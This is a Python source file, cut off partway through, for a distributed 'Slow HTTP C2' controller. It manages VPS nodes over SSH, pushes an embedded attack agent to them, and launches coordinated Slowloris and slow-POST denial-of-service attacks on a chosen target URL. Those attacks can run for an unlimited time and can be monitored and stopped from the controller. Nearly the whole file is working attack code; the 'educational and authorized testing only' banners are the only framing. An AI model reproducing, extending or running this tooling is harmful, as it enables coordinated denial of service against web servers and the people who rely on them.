#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Fixed Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️ WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Style
from urllib.parse import urlparse

# Initialize colorama
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                agent_deployed BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status, agent_deployed=None):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        if agent_deployed is not None:
            cursor.execute('''
                UPDATE vps_nodes SET status = ?, last_seen = ?, agent_deployed = ? WHERE ip_address = ?
            ''', (status, datetime.now().isoformat(), agent_deployed, ip))
        else:
            cursor.execute('''
                UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
            ''', (status, datetime.now().isoformat(), ip))
        
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}
        self.lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                self.connections[ip] = ssh
            
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def execute_command(self, ip, command, timeout=60):
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            with self.lock:
                ssh_client = self.connections[ip]
            
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            exit_status = stdout.channel.recv_exit_status()
            
            if exit_status == 0:
                return True, output if output else "Command executed successfully"
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except Exception as e:
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy the FIXED slow HTTP attack agent to VPS"""
        
        # Complete FIXED agent script
        agent_script = '''#!/usr/bin/env python3
import socket, threading, time, sys, random, string, signal, argparse, ssl
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self, host, port=80, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.conns = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0, 'active': 0, 'bytes_sent': 0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            return sock
        except Exception:
            with self.lock:
                self.stats['errors'] += 1
            return None
    
    def slowloris_attack(self, num_conns=100, delay=15, duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s")
        
        self.running = True
        start_time = time.time()
        
        # Create initial connections
        for i in range(num_conns):
            if not self.running:
                break
            
            sock = self.create_socket()
            if sock:
                try:
                    # Proper HTTP request headers
                    headers = [
                        f"GET /?id={random.randint(1000,99999)} HTTP/1.1",
                        f"Host: {self.host}",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        "Accept: text/html,application/xhtml+xml",
                        "Accept-Language: en-US,en;q=0.5",
                        "Connection: keep-alive"
                    ]
                    
                    # Send headers without final CRLF (keeps request incomplete)
                    for header in headers:
                        sock.send((header + "\\r\\n").encode())
                        time.sleep(0.001)
                    
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
                    try:
                        sock.close()
                    except:
                        pass
            
            time.sleep(0.05)
        
        print(f"[PHASE1] Created {len(self.conns)} connections")
        
        # Keep connections alive
        cycle_count = 0
        while self.running and self.conns:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            cycle_count += 1
            dead_conns = []
            
            for sock in self.conns:
                try:
                    # Send fake header to keep alive
                    header_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
                    header_value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
                    fake_header = f"X-{header_name}: {header_value}\\r\\n"
                    
                    sock.send(fake_header.encode())
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        self.stats['bytes_sent'] += len(fake_header)
                        
                except Exception:
                    dead_conns.append(sock)
                    with self.lock:
                        self.stats['errors'] += 1
            
            # Remove dead connections
            for sock in dead_conns:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
            
            with self.lock:
                self.stats['active'] = len(self.conns)
                print(f"[CYCLE {cycle_count}] Active: {self.stats['active']}, Sent: {self.stats['sent']}, Errors: {self.stats['errors']}")
            
            time.sleep(delay)
        
        self.stop()
    
    def slow_post_attack(self, num_conns=50, delay=1, duration=0):
        print(f"[SLOW POST] Starting R.U.D.Y attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s")
        
        self.running = True
        start_time = time.time()
        
        def post_worker(worker_id):
            sock = self.create_socket()
            if not sock:
                return
            
            try:
                content_length = random.randint(1000000, 50000000)
                
                # Send POST headers
                headers = [
                    f"POST /upload{worker_id} HTTP/1.1",
                    f"Host: {self.host}",
                    "Content-Type: application/x-www-form-urlencoded",
                    f"Content-Length: {content_length}",
                    "Connection: keep-alive",
                    ""  # Empty line ends headers
                ]
                
                headers_data = "\\r\\n".join(headers) + "\\r\\n"
                sock.send(headers_data.encode())
                
                with self.lock:
                    self.stats['sent'] += 1
                
                print(f"[WORKER {worker_id}] Headers sent, content-length: {content_length:,}")
                
                # Send POST body slowly
                bytes_sent = 0
                while self.running and bytes_sent < content_length:
                    if duration > 0 and (time.time() - start_time) >= duration:
                        break
                    
                    chunk_size = random.randint(1, 10)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    data = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += len(data)
                        
                        with self.lock:
                            self.stats['bytes_sent'] += len(data)
                            
                    except Exception:
                        break
                    
                    if bytes_sent % 100000 == 0:
                        progress = (bytes_sent / content_length) * 100
                        print(f"[WORKER {worker_id}] Progress: {progress:.1f}%")
                    
                    time.sleep(random.uniform(delay * 0.5, delay * 1.5))
                
            except Exception as e:
                with self.lock:
                    self.stats['errors'] += 1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # Start worker threads
        threads = []
        for i in range(num_conns):
            if not self.running:
                break
            
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        # Monitor threads
        while self.running and any(t.is_alive() for t in threads):
            if duration > 0 and (time.time() - start_time) >= duration:
                self.running = False
                break
            
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                bytes_sent = self.stats['bytes_sent']
                errors = self.stats['errors']
            
            print(f"[STATUS] Active workers: {active_threads}/{num_conns} | Bytes: {bytes_sent:,} | Errors: {errors}")
            
            if active_threads == 0:
                break
            
            time.sleep(10)
        
        self.stop()
    
    def stop(self):
        self.running = False
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()

# Global attacker instance
attacker = None

def signal_handler(sig, frame):
    global attacker
    print("\\n[SIGNAL] Received interrupt")
    if attacker:
        attacker.stop()
    sys.exit(0)

def main():
    global attacker
    
    parser = argparse.ArgumentParser(description='Fixed Slow HTTP Agent')
    parser.add_argument('target', help='Target URL or hostname')
    parser.add_argument('attack_type', choices=['slowloris', 'slow_post'])
    parser.add_argument('--connections', '-c', type=int, default=100)
    parser.add_argument('--delay', '-d', type=int, default=15)
    parser.add_argument('--duration', '-t', type=int, default=0)
    
    args = parser.parse_args()
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        parsed = urlparse(args.target)
        target_host = parsed.hostname
        target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
    else:
        if ':' in args.target:
            target_host, port_str = args.target.split(':', 1)
            try:
                target_port = int(port_str)
            except ValueError:
                target_port = 80
        else:
            target_host = args.target
            target_port = 80
        use_ssl = target_port == 443
    
    print("=" * 60)
    print("FIXED SLOW HTTP ATTACK AGENT")
    print("=" * 60)
    print(f"Target: {target_host}:{target_port}")
    print(f"SSL: {use_ssl}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections}")
    print("=" * 60)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    attacker = SlowHTTPAttack(target_host, target_port, use_ssl)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
    except KeyboardInterrupt:
        attacker.stop()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop()

if __name__ == "__main__":
    main()
'''
        
        # Deploy using proper method
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"
        ]
        
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        try:
            # Try SFTP first
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(agent_script)
                
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                os.remove(temp_file)
                
        except Exception as e:
            # Fallback to base64
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Transfer failed: {output}"
        
        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -c \"import py_compile; py_compile.compile('/tmp/slowhttp_c2/agent.py', doraise=True)\"",
            "python3 /tmp/slowhttp_c2/agent.py --help | head -3"
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=30)
            if not success:
                return False, f"Step {i+1} failed: {output}"
        
        return True, "Fixed agent deployed successfully"
    
    def get_connection_status(self, ip):
        with self.lock:
            return ip in self.connections
    
    def close_all_connections(self):
        with self.lock:
            for ip in list(self.connections.keys()):
                try:
                    self.connections[ip].close()
                except:
                    pass
            self.connections.clear()

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        # Parse target properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
        else:
            target_host = target_url.split(':')[0].split('/')[0]
            target_port = 80
            use_ssl = False
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        target_spec = f"https://{target_host}:{target_port}" if use_ssl else f"{target_host}:{target_port}"
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} on {target_spec}{Colors.RESET}")
        
        success_count = 0
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Build command
            connections = max(1, parameters.get('connections', 100))
            delay = max(0, parameters.get('delay', 15))
            duration = parameters.get('duration', 0)
            
            cmd = f"cd /tmp/slowhttp_c2 && nohup python3 agent.py '{target_spec}' {attack_type} "
            cmd += f"--connections {connections} --delay {delay} "
            
            if duration > 0:
                cmd += f"--duration {duration} "
            
            timestamp = int(time.time())
            cmd += f"> attack_{timestamp}.log 2>&1 & "
            cmd += "sleep 2 && tail -5 attack_*.log 2>/dev/null | head -3"
            
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            if success and ("Starting attack" in output or "SLOWLORIS" in output or "SLOW POST" in output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS{Colors.RESET}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            return False
    
    def stop_attack(self, session_id):
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[STOPPING] Stopping attack...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            cmd = "pkill -f 'python3.*agent.py' 2>/dev/null; sleep 1; ps aux | grep 'agent.py' | grep -v grep | wc -l"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            if success and output.strip() == '0':
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.YELLOW}PARTIAL{Colors.RESET}")
                stop_count += 1
        
        self.active_attacks[session_id]['status'] = 'stopped'
        return True, f"Stop sent to {stop_count} VPS"
    
    def get_attack_status(self, session_id):
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            active_processes = 0
            if success and output.strip().isdigit():
                active_processes = int(output.strip())
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle'
            }
        
        return status

class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
        self.ssh_manager.close_all_connections()
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                 SLOW HTTP C2 - FIXED EDITION                ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️ FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Attack
{Colors.GREEN}[3]{Colors.RESET} Monitor Attacks  
{Colors.GREEN}[4]{Colors.RESET} Attack History
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Location':<15}")
                print("-" * 70)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    location = (vps[8] or 'Unknown')[:14]
                    
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {location:<15}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Agents
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-4): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '0':
                break
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 40)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
            
            if success:
                print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'online')
                online_count += 1
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline')
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING FIXED AGENTS{Colors.RESET}")
        print("-" * 30)
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
                self.db_manager.update_vps_status(ip, 'online', agent_deployed=True)
            else:
                print(f"{Colors.RED}FAILED - {message[:50]}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} agents deployed{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    if self.db_manager.remove_vps(vps[1]):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except (KeyboardInterrupt, ValueError):
            print(f"\n{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH FIXED ATTACK{Colors.RESET}")
        print("=" * 30)
        
        print(f"\n{Colors.GREEN}Available VPS: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET:{Colors.RESET}")
            target_url = self.input_with_prompt("Target URL: ")
            if not target_url:
                return
            
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            # Attack type
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST")
            
            attack_choice = self.input_with_prompt("Select (1-2): ")
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Parameters
            print(f"\n{Colors.BOLD}PARAMETERS:{Colors.RESET}")
            
            connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
            try:
                connections = max(1, int(connections_str))
            except ValueError:
                connections = 100
            
            delay_str = self.input_with_prompt("Delay between packets (default 15): ", False) or "15"
            try:
                delay = max(0, int(delay_str))
            except ValueError:
                delay = 15
            
            duration_str = self.input_with_prompt("Duration in seconds (0=unlimited): ", False) or "0"
            try:
                duration = max(0, int(duration_str))
            except ValueError:
                duration = 0
            
            # Summary
            print(f"\n{Colors.BOLD}ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            print(f"Type: {Colors.YELLOW}{attack_type.upper()}{Colors.RESET}")
            print(f"VPS: {Colors.YELLOW}{len(online_vps)}{Colors.RESET}")
            print(f"Connections: {Colors.YELLOW}{connections:,} per VPS{Colors.RESET}")
            print(f"Total: {Colors.YELLOW}{len(online_vps) * connections:,}{Colors.RESET}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
            
            # Confirmation
            confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED]{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Launch
            session_name = f"Attack_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            parameters = {
                'connections': connections,
                'delay': delay,
                'duration': duration
            }
            
            selected_vps = [vps[1] for vps in online_vps]
            
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            success = self.attack_manager.launch_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] Attack launched!{Colors.RESET}")
